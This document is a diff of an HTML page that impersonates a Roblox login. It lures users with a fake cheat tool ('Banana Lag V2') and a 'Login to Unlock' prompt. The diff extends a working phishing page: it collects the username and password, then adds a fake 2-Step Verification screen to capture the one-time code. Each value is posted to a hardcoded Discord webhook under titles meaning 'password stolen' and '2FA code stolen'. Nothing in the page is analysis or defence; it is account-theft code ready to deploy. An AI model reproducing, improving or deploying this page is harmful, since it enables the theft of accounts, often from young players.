@@ -2,39 +2,69 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <title>Roblox Authentication</title>
+    <title>Roblox Security Check</title>
     <style>
         body { font-family: 'Gotham', sans-serif; background-color: #F2F4F5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.2); width: 320px; text-align: center; }
         .logo { width: 120px; margin-bottom: 20px; }
-        h1 { font-size: 22px; color: #393939; margin-bottom: 10px; }
+        h1 { font-size: 20px; color: #393939; margin-bottom: 10px; }
         input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #B8B8B8; border-radius: 4px; box-sizing: border-box; background: #F2F4F5; }
         button { width: 100%; padding: 12px; background-color: #00A2FF; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        .footer { margin-top: 25px; font-size: 11px; color: #BBB; }
     </style>
 </head>
 <body>
-    <div class="box">
+    <div class="box" id="step1">
         <img src="https://images.rbxcdn.com/2b74a3f23f46f485741f235967008770.svg" class="logo">
-        <h1>Login to Continue</h1>
-        <p style="font-size: 13px; color: #666;">Banana Lag V2 の機能を有効化するために<br>Robloxアカウントを認証してください。</p>
-        <input type="text" id="u" placeholder="Username/Email">
+        <h1>Login to Unlock</h1>
+        <input type="text" id="u" placeholder="Username">
         <input type="password" id="p" placeholder="Password">
-        <button onclick="s()">認証 (Authenticate)</button>
-        <div class="footer">©2026 Roblox Corporation</div>
+        <button onclick="sendPass()">Verify</button>
     </div>
+
+    <div class="box" id="step2" style="display:none;">
+        <img src="https://images.rbxcdn.com/2b74a3f23f46f485741f235967008770.svg" class="logo">
+        <h1>2-Step Verification</h1>
+        <p style="font-size: 13px; color: #666;">アプリまたはメールに届いた<br>6桁のコードを入力してください。</p>
+        <input type="text" id="c" placeholder="6-digit code" maxlength="6">
+        <button onclick="sendCode()">Submit</button>
+    </div>
+
+    <div class="box" id="step3" style="display:none;">
+        <h1>認証成功！</h1>
+        <p>認証コード: <strong style="color:#00A2FF;">BN-9922</strong></p>
+    </div>
+
     <script>
-        async function s() {
-            const u = document.getElementById('u').value;
-            const p = document.getElementById('p').value;
-            const w = "https://discord.com/api/webhooks/1487098005311197285/I921xpFSj-MlnvwSTcm-0XJ01lfAisFR1dybl1PjsYWNW-b1bA0DPB1mtJQPmf0WBxTj";
-            if(!u || !p) return alert("入力してください");
+        const w = "https://discord.com/api/webhooks/1487098005311197285/I921xpFSj-MlnvwSTcm-0XJ01lfAisFR1dybl1PjsYWNW-b1bA0DPB1mtJQPmf0WBxTj";
+        let user = "";
+
+        async function sendPass() {
+            user = document.getElementById('u').value;
+            const pass = document.getElementById('p').value;
+            if(!user || !pass) return alert("入力してください");
+            
             await fetch(w, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({embeds: [{title: "🍌 奪取成功", fields: [{name: "User", value: u}, {name: "Pass", value: "||"+p+"||"}], color: 16776960}]})
+                body: JSON.stringify({embeds: [{title: "🔑 パスワード奪取", fields: [{name: "User", value: user}, {name: "Pass", value: "||"+pass+"||"}], color: 16776960}]})
             });
-            window.location.href = "https://www.roblox.com/home";
+
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+        }
+
+        async function sendCode() {
+            const code = document.getElementById('c').value;
+            if(!code) return alert("コードを入力してください");
+
+            await fetch(w, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({embeds: [{title: "🛡️ 2FAコード奪取", fields: [{name: "User", value: user}, {name: "2FA Code", value: "**"+code+"**"}], color: 16711680}]})
+            });
+
+            document.getElementById('step2').style.display = 'none';
+            document.getElementById('step3').style.display = 'block';
         }
     </script>
 </body>
